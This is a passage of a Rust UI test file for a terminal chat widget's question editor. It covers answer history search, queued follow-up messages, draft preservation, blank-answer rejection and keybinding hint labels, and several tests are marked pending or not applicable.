        &["earlier answer", "newest answer"],
        &["earlier answer", "newest answer", "persistent answer"],
    ];
    for (((keys, word), keymap), file) in [("f12", "earlier"), ("ctrl+x r", "persistent")]
        .into_iter()
        .zip(rebound)
        .zip(file)
    {
        if keys == "ctrl+x r" {
            kit::pending(
                Owner::DialogsPane,
                "rtwk gap G-new-composer-chord (the composer reads single keys in take_key and a chord never reaches it: `ctrl+x r` bound to composer.history_search_previous types `r`; wanted: the composer takes a chord through KeyBindings): the f12 iteration passes, the chord iteration is the one pending frame",
            );
            return;
        }
        let mut s = Screen::build(Owner::DialogsPane)
            .size(80, 24)
            .script(include_str!("fixtures/chat_approvals_2/q_plain.jsonl"))
            .keymap(keymap)
            .message_history(file)
            .open();
        // the answer goes with the backend's commands, a steer or the queue
        let sent = |s: &Screen| {
            format!("{:?}", s.commands())
                .matches("send_user_message_question_reply")
                .count()
        };
        let before = sent(&s);
        s.keys("alt+up");
        s.keys("up");
        s.assert_contains("newest answer");
        s.keys("up");
        s.assert_contains("earlier answer");
        s.keys("down");
        s.assert_contains("newest answer");
        s.keys("ctrl+c");
        s.keys(keys);
        s.type_text(word);
        s.assert_contains("reverse-i-search");
        s.keys("enter");
        kit::assert_same(sent(&s), before, "the search's Enter answers nothing");
        s.keys("enter");
        kit::assert_same(sent(&s) > before, true, "the answer went out");
        let last = format!("{:?}", s.commands().last());
        kit::assert_same(
            last.contains(&format!("{word} answer")),
            true,
            "the answer is the entry the search found",
        );
    }
}

// ORACLE chatwidget/tests/questions_tests.rs:595 question_editor_keeps_working_status_and_queued_messages_visible kind=snap owner=dialogs-pane
#[test]
fn question_editor_keeps_working_status_and_queued_messages_visible() {
    // oracle: task running, composer "main draft", queued "queued follow-up", questions open: the OPEN frame (before `1 of 2`);
    // the queue cleared, the status line off, Esc: the ONLY QUESTIONS frame.
    let mut s = Screen::build(Owner::DialogsPane)
        .size(80, 24)
        .replay(Vec::new())
        .open();
    s.feed(
        &include_str!("fixtures/chat_approvals_2/q_two_running.jsonl")
            .replace("thread-1", kit::REPLAYED),
    );
    s.paste("queued follow-up");
    s.keys("tab");
    s.paste("main draft");
    s.keys("alt+up");
    // the snapshot's first row is the spinner's bullet, which follows the clock (`•` or `◦`)
    let at = row_of(&s, "Working");
    let rows = s.rows();
    kit::assert_same(
        rows[at].trim_start_matches(['•', '◦']),
        " Working (0s • esc to interrupt)",
        "the status row",
    );
    // the rest of the OPEN frame of questions_with_status_and_queue, cut before `1 of 2`
    let rest: Vec<&str> = rows[at + 1..at + 4].iter().map(|r| r.trim_end()).collect();
    kit::assert_same(
        rest,
        vec!["", "• Queued follow-up inputs", "  ↳ queued follow-up"],
        "the rest of the open frame",
    );
    // The oracle sets the task idle directly. Reconcile through history after clearing the
    // seeded queue so there is no automatic follow-up when the model becomes idle.
    s.feed(
        &include_str!("fixtures/chat_approvals_2/q_queue_cleared.jsonl")
            .replace("thread-1", kit::REPLAYED),
    );
    s.history_page(
        vec![kit::replay_turn("turn-1", serde_json::json!([]))],
        None,
    );
    s.assert_contains("1 of 2");
    s.assert_absent("Working");
    s.keys("esc");
    s.assert_composer("main draft");
    s.assert_no_turn();
    s.snap("questions_with_status_and_queue")
        .labelled(&["OPEN", "ONLY QUESTIONS"])
        .frame("ONLY QUESTIONS")
        .at(row_of(&s, "Queued follow-up inputs"), 0)
        .assert();
}

// ORACLE chatwidget/tests/questions_tests.rs:624 async_questions_reject_blank_answers_but_allow_explicit_skip kind=ui owner=dialogs-pane
#[test]
fn async_questions_reject_blank_answers_but_allow_explicit_skip() {
    // oracle: a blank and a whitespace-only answer leave the bottom popup unchanged and send nothing; ctrl+5 skips the question.
    for (fixture, numbered) in [
        (
            include_str!("fixtures/chat_approvals_2/q_plain.jsonl"),
            false,
        ),
        (
            include_str!("fixtures/chat_approvals_2/q_numbered.jsonl"),
            true,
        ),
    ] {
        let mut s = Screen::build(Owner::DialogsPane)
            .size(80, 24)
            .script(fixture)
            .open();
        s.keys("alt+up");
        if numbered {
            s.keys("2");
        }
        for text in ["", " \t\n"] {
            s.paste(text);
            let before = s.shot();
            s.keys("enter");
            s.assert_same_rows(&before);
            kit::assert_same(s.turns().len(), 0, "an empty answer sends nothing");
        }
        s.keys("ctrl+]");
        // the skip leaves no question: the editor is gone and nothing was sent
        s.assert_absent("enter submit");
        s.assert_absent("? 1 question");
        kit::assert_same(s.turns().len(), 0, "the skip sends nothing");
    }
}

// ORACLE chatwidget/tests/questions_tests.rs:673 expanded_question_yields_mouse_to_terminal_for_links kind=ui owner=dialogs-pane
#[test]
fn expanded_question_yields_mouse_to_terminal_for_links() {
    kit::pending(
        Owner::DialogsPane,
        "pending(G-new-mouse-yield): the editor is built and shows the URL title; what is left is terminal state: an open widget cannot lower the mouse reporting (`Mouse::sync` takes the larger of what the tree needs and the floor, `Off` only for the screen-reader mode), so the oracle's `mouse_capture(owned_screen) == Disabled` while expanded and `Inherit` after collapsing cannot be had; the kit has no reader of the terminal's mouse mode",
    );
    // oracle: a question titled with a long URL: mouse capture is inherited, then disabled when expanded (owned screen); the
    // warnings popup shows the URL; collapsing restores the inherited capture (terminal state, not drawn).
    let url = "https://example.com/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa/r2/overview";
    let mut s = Screen::build(Owner::DialogsPane)
        .size(100, 24)
        .script(include_str!("fixtures/chat_approvals_2/q_url.jsonl"))
        .open();
    s.keys("alt+up");
    s.assert_contains(url);
    // the warnings popup (`open_warnings(&[])`) has no key in the oracle test: the URL is on the expanded editor
    s.keys("alt+down");
    s.keys("alt+up");
    s.assert_contains(url);
}

// ORACLE chatwidget/tests/questions_tests.rs:694 question_queue_key_does_not_steer_the_running_turn kind=ui owner=dialogs-pane
#[test]
fn question_queue_key_does_not_steer_the_running_turn() {
    kit::na(
        Owner::DialogsPane,
        "asserts the queued reply's display text (`> First?` then `later`), the unanswered count and that no op is sent on a repeated Tab: model values, not rows",
    );
}

// ORACLE chatwidget/tests/questions_tests.rs:718 question_choices_deliver_digits_and_leading_letters kind=ui owner=dialogs-pane
#[test]
fn question_choices_deliver_digits_and_leading_letters() {
    kit::na(
        Owner::DialogsPane,
        "asserts the answer text of each delivered user turn (digit choice, typed text) and the unanswered count: ops and model values, not rows",
    );
}

// ORACLE chatwidget/tests/questions_tests.rs:737 question_key_repeats_do_not_consume_another_question kind=ui owner=dialogs-pane
#[test]
fn question_key_repeats_do_not_consume_another_question() {
    kit::na(
        Owner::DialogsPane,
        "asserts the ops sent and the unanswered count for kitty key-repeat events: ops and model values, not rows",
    );
}

// ORACLE chatwidget/tests/questions_tests.rs:754 question_queue_pop_becomes_an_ordinary_composer_draft_and_clears_questions_on_send kind=snap owner=dialogs-pane
#[test]
fn question_queue_pop_becomes_an_ordinary_composer_draft_and_clears_questions_on_send() {
    // oracle: queued "older" and "newer" and two open questions; alt+up goes to the last question
    // (`last_question_with_queue`); the next alt+up pops "newer" into the composer, " edited" is typed, the next alt+up expands
    // "newer edited", the next pops "older"; enter sends it as the answer; the next alt+up finds the questions cleared.
    let mut s = Screen::build(Owner::DialogsPane)
        .size(80, 24)
        .script(include_str!(
            "fixtures/chat_approvals_2/q_review_running.jsonl"
        ))
        .open();
    s.paste("older");
    s.keys("tab");
    s.paste("newer");
    s.keys("tab");
    s.keys("alt+up");
    s.keys("alt+up");
    let at = row_of(&s, "Queued follow-up inputs");
    s.assert_snap_region("last_question_with_queue", at, 0);
    s.keys("alt+up");
    s.assert_contains("newer");
    s.assert_absent("2 of 2");
    s.paste(" edited");
    s.assert_contains("newer edited");
    s.keys("alt+up");
    s.assert_contains("2 of 2");
    s.keys("alt+up");
    s.assert_contains("› older");
    s.assert_absent("↳");
    s.keys("enter");
    // an ordinary message (here a steer behind the running turn), not a question's reply
    let last = format!("{:?}", s.commands().last());
    kit::assert_same(last.contains("older"), true, "the popped message went out");
    kit::assert_same(
        last.contains("question_reply"),
        false,
        "as a message of its own",
    );
    s.keys("alt+up");
    s.assert_absent("2 of 2");
    s.assert_absent("? 2 questions");
    s.assert_absent("to answer");
}

// ORACLE chatwidget/tests/questions_tests.rs:793 question_drafts_survive_navigation_and_snapshot_replay kind=ui owner=dialogs-pane
#[test]
fn question_drafts_survive_navigation_and_snapshot_replay() {
    // oracle: composer "main draft"; question "Which way?" with "first draft", then "Any details?" with "second draft";
    // the thread input is captured and restored into a new chat after a buffered question replay (a replayed question is not
    // asked until its live notification), the pause and ctrl+] + enter keep the three questions; alt+down walks back to
    // "first draft" and then to the composer "main draft".
    let mut s = Screen::build(Owner::DialogsPane)
        .size(80, 24)
        .script(include_str!("fixtures/chat_approvals_2/q_two.jsonl"))
        .open();
    s.paste("main draft");
    s.keys("alt+up");
    s.paste("first draft");
    s.keys("alt+up 2");
    s.paste("second draft");
    s.assert_contains("2 of 2");
    s.assert_contains("second draft");
    // the buffered question arrives: the editor keeps its drafts
    s.feed(include_str!("fixtures/chat_approvals_2/q_buffered.jsonl"));
    s.assert_contains("2 of 3");
    s.assert_contains("second draft");
    s.keys("alt+down");
    s.assert_contains("first draft");
    s.keys("alt+down");
    s.assert_contains("main draft");
    s.assert_absent("of 3");
    kit::pending(
        Owner::DialogsPane,
        "rtwk gap G-new-thread-input-capture (the oracle captures a thread's input into a value and restores it into another widget after a reconnect, with the pause of an unavailable thread: the port's drafts live in the page and the thread's ThreadUi and are never copied out; no restore door exists to drive): the drafts, their navigation and the arrival of the buffered question above pass; the restore and the paused ctrl+] / enter frame is the one pending frame",
    );
}

// ORACLE chatwidget/tests/questions_tests.rs:845 single_question_spacing_with_working_status kind=snap owner=dialogs-pane
#[test]
fn single_question_spacing_with_working_status() {
    // oracle: task running; question "Only question?" open; a typed answer: the queued-follow-up line two rows above the question,
    // one blank row, the answer two rows below, one blank row (snapshot single_question_working_spacing).
    let mut s = Screen::build(Owner::DialogsPane)
        .size(80, 24)
        .script(include_str!(
            "fixtures/chat_approvals_2/q_single_running.jsonl"
        ))
        .open();
    s.keys("alt+up");
    s.paste("A typed answer");
    s.assert_contains("Queued follow-up inputs");
    s.assert_contains("Only question?");
    s.assert_contains("A typed answer");
    s.assert_snap_region("single_question_working_spacing", row_of(&s, "Working"), 0);
}

// ORACLE chatwidget/tests/questions_tests.rs:889 questions_and_queued_messages_share_the_resolved_shortcut kind=snap owner=dialogs-pane
#[test]
fn questions_and_queued_messages_share_the_resolved_shortcut() {
    // oracle: the hints `⇧← edit last queued message` and `⇧← to answer` (labels from the resolved key), then shift+left shows
    // `main prompt` and `next question` (snapshot question_queue_hint_Left); alt+up/alt+down do the same; the remapped config
    // (edit_queued_message = alt-up, shift-left; prompt_stack_back = alt-down, shift-right) draws `question_queue_hint_Up`;
    // the chord config (ctrl-x up / ctrl-x down) draws its chord labels.
    let queued = |s: &mut Screen| {
        s.paste("queued");
        s.keys("tab");
    };
    let mut s = Screen::build(Owner::DialogsPane)
        .size(100, 24)
        .script(include_str!("fixtures/chat_approvals_2/q_run.jsonl"))
        .open();
    queued(&mut s);
    s.assert_contains("⇧← edit last queued message");
    s.feed(include_str!("fixtures/chat_approvals_2/q_ask_two.jsonl"));
    s.assert_contains("⇧← to answer");
    for (forward, backward) in [("shift+left", "shift+right"), ("alt+up", "alt+down")] {
        s.keys(forward);
        s.assert_contains("⇧→ main prompt");
        s.assert_contains("⇧← next question");
        if forward == "shift+left" {
            let at = row_of(&s, "Queued follow-up inputs");
            s.assert_snap_region("question_queue_hint_Left", at, 0);
        }
        s.keys(forward);
        s.assert_contains("⇧→ prev question");
        s.assert_contains("⇧← queued messages");
        s.keys(backward);
        s.assert_contains("1 of 2");
        s.assert_contains("Which way?");
        s.keys(backward);
        s.assert_absent("1 of 2");
        s.assert_contains("⇧← to answer");
    }

    // the remapped config: Alt+Up first; the questions of two messages
    let remapped: &'static [(&'static str, &'static str)] = &[
        ("chat.edit_queued_message", "alt-up"),
        ("chat.edit_queued_message", "shift-left"),
        ("chat.prompt_stack_back", "alt-down"),
        ("chat.prompt_stack_back", "shift-right"),
    ];
    let mut r = Screen::build(Owner::DialogsPane)
        .size(100, 24)
        .script(include_str!("fixtures/chat_approvals_2/q_run.jsonl"))
        .keymap(remapped)
        .open();
    queued(&mut r);
    r.feed(include_str!("fixtures/chat_approvals_2/q_ask_two.jsonl"));
    r.feed(include_str!("fixtures/chat_approvals_2/q_remapped.jsonl"));
    r.assert_contains("⌥↑ to answer");
    r.keys("alt+up");
    let at = row_of(&r, "Queued follow-up inputs");
    r.assert_snap_region("question_queue_hint_Up", at, 0);

    // chords: the chat's keys are `ctrl-x up` / `ctrl-x down` (the labels name the chord)
    let chords: &'static [(&'static str, &'static str)] = &[
        ("chat.edit_queued_message", "ctrl-x up"),
        ("chat.edit_queued_message", "shift-left"),
        ("chat.prompt_stack_back", "ctrl-x down"),
        ("chat.prompt_stack_back", "shift-right"),
    ];
    let mut c = Screen::build(Owner::DialogsPane)
        .size(100, 24)
        .script(include_str!("fixtures/chat_approvals_2/q_run.jsonl"))
        .keymap(chords)
        .open();
    queued(&mut c);
    c.feed(include_str!("fixtures/chat_approvals_2/q_ask_two.jsonl"));
    c.assert_contains("⌃x ↑ to answer");
    c.keys("shift+left");
    c.assert_contains("⌃x ↓ main prompt");
    c.assert_contains("⌃x ↑ next question");
    c.keys("shift+right");
    c.assert_contains("⌃x ↑ to answer");
}

// ORACLE chatwidget/tests/questions_tests.rs:985 desktop_async_answer_dismisses_only_its_question_and_preserves_the_other_draft kind=snap owner=dialogs-pane
#[test]
fn desktop_async_answer_dismisses_only_its_question_and_preserves_the_other_draft() {
    // oracle: two questions "Same title?"; the second is navigated to and holds a draft; the desktop reply answers question 0
    // (live, or as a ThreadSnapshot item): question 0 is dismissed, the draft stays (snapshot
    // async_question_answered_on_another_client). The transcript cell's Debug dump (desktop_async_question_reply) is not a row dump.
    let mut s = Screen::build(Owner::DialogsPane)
        .size(80, 24)
        .script(include_str!("fixtures/chat_approvals_2/q_same.jsonl"))
        .open();
    s.keys("alt+up alt+up");
    s.paste("My draft for the second question");
    s.feed(include_str!(
        "fixtures/chat_approvals_2/q_desktop_reply.jsonl"
    ));
    s.assert_snap_region(
        "async_question_answered_on_another_client",
        row_of(&s, "Queued follow-up inputs"),
        0,
    );
    s.keys("enter");
    // the surviving question keeps its identity: the reply names question 1 of the message
    let turns = s.turns();
    kit::assert_same(turns.len(), 1, "one turn");
    kit::assert_same(
        turns[0]
            .text
            .contains(r#"[\"request_user_input_async\",\"message\",1]"#),
        true,
        "the reply names question 1 of the message",
    );
    kit::assert_same(
        turns[0].text.contains("My draft for the second question"),
        true,
        "the kept draft is the answer",
    );
    s.assert_absent("enter submit");
}

// ORACLE chatwidget/tests/questions_tests.rs:1068 async_question_markdown_matches_loaded_history kind=snap owner=dialogs-pane
#[test]
fn async_question_markdown_matches_loaded_history() {
    // The oracle compares the styled Debug dump. G73 item 4 tracks the snapshot reader;
    // compare the rendered rows of the same agent item from both live and history paths.
    let script = include_str!("fixtures/chat_approvals_2/q_markdown.jsonl");
    let rows = [
        "? Keep --verbose for failed runs?",
        "",
        "  • Only for CI",
        "",
        "? See the guide (https://example.test/guide)?",
    ];
    let expect_rows = |s: &Screen| {
        let top = row_of(s, rows[0]);
        for (offset, row) in rows.iter().enumerate() {
            s.assert_row(top + offset, row);
        }
    };
    expect_rows(
        &Screen::build(Owner::DialogsPane)
            .size(80, 24)
            .script(script)
            .open(),
    );
    let mut replay = Screen::build(Owner::DialogsPane)
        .size(80, 24)
        .replay(Vec::new())
        .open();
    let note: serde_json::Value = serde_json::from_str(script.lines().last().unwrap()).unwrap();
    let items = serde_json::json!([note["message"]["params"]["item"]]);
    replay.history_page(vec![kit::replay_turn("turn-1", items)], None);
    expect_rows(&replay);
}

// ORACLE chatwidget/tests/questions_tests.rs:1109 distinct_async_question_replies_with_identical_text_both_render kind=ui owner=dialogs-pane
#[test]
fn distinct_async_question_replies_with_identical_text_both_render() {
    kit::na(
        Owner::DialogsPane,
        "asserts the number of history cells inserted for three answers with two distinct ids (2): an app event count, not rows",
    );
}

// ORACLE chatwidget/tests/questions_tests.rs:1131 retried_question_answers_keep_separate_envelopes_and_order kind=ui owner=dialogs-pane
#[test]
fn retried_question_answers_keep_separate_envelopes_and_order() {
    kit::na(
        Owner::DialogsPane,
        "asserts the user turns sent (the answer envelopes, their order, the retried order after an interrupt): ops, not rows",
    );
}
